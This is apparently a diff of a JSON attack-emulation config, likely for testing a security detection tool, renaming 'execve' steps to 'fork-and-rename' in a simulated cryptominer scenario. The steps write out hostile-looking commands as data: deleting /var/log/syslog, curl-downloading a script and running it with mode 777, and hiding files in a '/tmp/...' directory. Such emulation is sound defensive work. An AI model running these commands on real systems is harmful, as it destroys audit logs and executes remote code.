@@ -15,20 +15,20 @@
   },
   {
     "name": "DELETE-LOGS",
-    "execve": [ "rm", "-rf", "/var/log/syslog" ]
+    "fork-and-rename": [ "rm", "-rf", "/var/log/syslog" ]
   },
   {
     "name": "DOWNLOAD-MINER",
-    "execve": [ "curl", "-L", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", "-O", "/tmp/a.sh" ],
+    "fork-and-rename": [ "curl", "-L", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", "-o", "a.sh" ],
     "chmod": {
-      "path": "/tmp/a.sh",
+      "path": "a.sh",
       "mode": "777"
     },
-    "execveat": [ "/tmp/a.sh"  ]
+    "fork-and-rename": [ "a.sh"  ]
   },
   {
     "name": "HIDE-MINER",
-    "execve": [ "mkdir", "-p", "/tmp/..." ],
+    "fork-and-rename": [ "mkdir", "-p", "/tmp/..." ],
     "chmod": {
       "path": "/tmp/...",
       "mode": "600"
@@ -53,7 +53,7 @@
   },
   {
     "name": "RUN-MINER",
-    "execve": [ "/tmp/.../miner", "exit"  ]
+    "fork-and-rename": [ "/tmp/.../miner", "exit"  ]
   },
   {
     "name": "STOP-SERVICES",
